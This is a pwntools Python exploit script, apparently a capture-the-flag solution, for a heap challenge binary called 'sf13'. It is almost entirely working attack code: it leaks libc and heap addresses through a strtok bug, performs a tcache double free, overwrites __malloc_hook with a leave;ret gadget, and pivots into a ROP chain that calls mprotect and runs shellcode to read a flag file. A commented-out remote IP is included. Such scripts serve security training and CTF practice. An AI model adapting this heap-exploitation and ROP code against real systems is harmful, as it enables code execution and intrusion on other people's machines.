from pwn import*
#p = remote('35.238.184.137',4000)
p = process('./sf13')
elf = ELF('./sf13',checksec=False)
context(arch = 'amd64', os = 'linux')
sleep(0.3)
t  = 0
### def
def menu(sel):
    p.sendlineafter('> ',str(sel))

def alloc(size1,datas,yn1,size2,yn2):
    menu(1)
    p.sendlineafter('size : ',str(size1))
    p.sendlineafter('datas : ',datas)
    p.sendlineafter('(y/n) ',yn1)
    if yn1 == 'y':
        p.sendlineafter('size : ',str(size2));
    p.sendlineafter('(y/n) ',yn2)

def delete(index):
    menu(2)
    p.sendlineafter('index : ',str(index))

### exploit
# libc leak
alloc(0x500,'aaaaaaaa','y',8,'y')       # make unsorted bin
menu(1)
p.sendlineafter('size : ','-1');sleep(t)# strtok vulnablity : libc leak
p.sendline('n');sleep(t);
p.sendline('n');sleep(t);

p.recvuntil('data : ')
main_arena_96 = u64(p.recv(6).ljust(8,'\x00'))
libc_base = main_arena_96 - 0x3ebca0

log.info("libc_base : {}".format(hex(libc_base)))
log.info("main_arnea : {}".format(hex(main_arena_96)))

# heap leak
alloc(0x500,'a','n',0,'n')              # delete unsorted bin becase i dont want to allocate in unsorted bin
menu(1)
p.sendlineafter(' : ',str(0x10))        # make tcache bin stage 1
p.sendlineafter('datas : ','')
p.sendlineafter(') ','y');sleep(t)

menu(1)
p.sendlineafter(' : ',str(0x10))        # make tcache bin stage 2
p.sendlineafter('datas : ','')
p.sendlineafter(') ','y');sleep(t)
menu(1)
p.sendlineafter(' : ','-1')             # strtok vulnablity : heap leak
p.sendline('n')
p.sendline('n')
p.recvuntil('target data : ')
heap_addr = u64(p.recv(6).ljust(8,'\x00'))
top_heap = heap_addr - 0x260
heap_base = top_heap - 0x530
log.info("heap_base : {}".format(hex(heap_base)))
log.info("top_heap : {}".format(hex(top_heap)))
# shellcode payload 
shellcode = ''
shellcode += asm('add rsp, 0x300')
shellcode += asm(shellcraft.open("/home/sf13/flag"))
shellcode += asm(shellcraft.read("rax",heap_base+0x3000,0x100))
shellcode += asm(shellcraft.write(1,heap_base+0x3000,0x100))

# ROP payload
pop_rax = libc_base + 0x439c8
pop_rdi = libc_base + 0x2155f
pop_rsi = libc_base + 0x23e6a
pop_rdx = libc_base + 0x1b96
libc_mprotect = libc_base + 0x11bae0

pay = ''
pay += 'X'*8
pay += p64(pop_rdi)
pay += p64(heap_base)
pay += p64(pop_rsi)
pay += p64(0x30000)
pay += p64(pop_rdx)
pay += p64(7)
pay += p64(libc_mprotect)
pay += p64(heap_base + 2000+0x100)
pay += '\x90'*(0x100-len(pay))
pay += shellcode

# double free
last_heap = top_heap + 0x2a0
offset = 0
while True:                             # 0x00xx 
    tmp = hex(last_heap+offset)
    if tmp[-3] == '0' and tmp[-4] == '0':
        break
    offset += 0x100
offset = offset - 0x1000

alloc(offset-0x10,pay,'n',0,'n')        # upload exploit payload

alloc(0x1000,'a','y',0x500,'n')         # heap page + 0x1000
last_heap = last_heap + offset + 0x1500
offset = 0

while True:                             # 0x3bxx
    tmp = hex(last_heap+offset)
    if tmp[-3] == 'b' and tmp[-4] == '3':
        break
    offset += 0x100

print(tmp)

alloc(offset-0x20,'a','n',0,'n')        
alloc(0x30,'a','n',0,'y')               # tcache bin [0x40]
delete(1)
menu(1)
p.sendlineafter(' : ','48')             # '0xcb' -> '0x00' stage 1
p.sendline('')
p.sendlineafter(')','y')
menu(1)
p.sendlineafter(' : ','-1')             # '0xcb' -> '0x00' stage 2
p.sendlineafter(') ','n')
p.sendline('n')
p.sendline('n')

# malloc hook overwrite
malloc_hook = libc_base + 0x3ebc30
leave_ret = libc_base + 0x54803
alloc(0x100,p64(malloc_hook),'y',0x30,'n')
alloc(0x100,'a','y',0x30,'n')
alloc(0x100,p64(leave_ret),'y',0x30,'n')
p.sendlineafter('> ','1');sleep(t)
p.sendlineafter(' : ',str(heap_base+2000))         # input size = rbp
print(hex(heap_base + 2000))

p.interactive()










